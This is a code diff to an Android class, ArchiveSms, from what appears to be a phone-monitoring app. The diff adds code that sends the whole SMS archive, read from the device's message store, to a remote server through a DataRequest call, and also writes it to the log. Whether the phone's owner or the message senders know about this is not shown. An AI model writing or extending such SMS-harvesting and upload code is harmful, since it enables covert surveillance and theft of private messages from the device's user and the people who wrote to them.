@@ -10,6 +10,7 @@ import android.os.AsyncTask;
 import android.util.Log;
 
 import com.inet.android.convertdate.ConvertDate;
+import com.inet.android.request.DataRequest;
 
 /**
  * Archive Sms. Watch sms
@@ -24,7 +25,7 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 	public void getSmsLogs() {
 		try {
 			// формируем JSONobj
-			JSONObject AllCallJson = new JSONObject();
+			JSONObject AllSmsJson = new JSONObject();
 			date = new ConvertDate();
 			String sType = "null";
 			Uri uri = Uri.parse("content://sms");
@@ -71,7 +72,7 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 							infoCallJson.put("duration",
 									sms_sent_cursor.getColumnIndex("body"));
 							archiveCallJson.put("info", infoCallJson);
-							AllCallJson.put("data", archiveCallJson);
+							AllSmsJson.put("data", archiveCallJson);
 
 						} catch (JSONException e) {
 							// TODO Автоматически созданный блок catch
@@ -106,6 +107,11 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 
 				}
 				sms_sent_cursor.close();
+				if (AllSmsJson != null) {
+					DataRequest dr = new DataRequest(mContext);
+					dr.sendRequest(AllSmsJson.toString());
+					Log.d("JsonCall", AllSmsJson.toString());
+				}
 				// Log.d("JsonSms", AllCallJson.toString());
 
 			} else
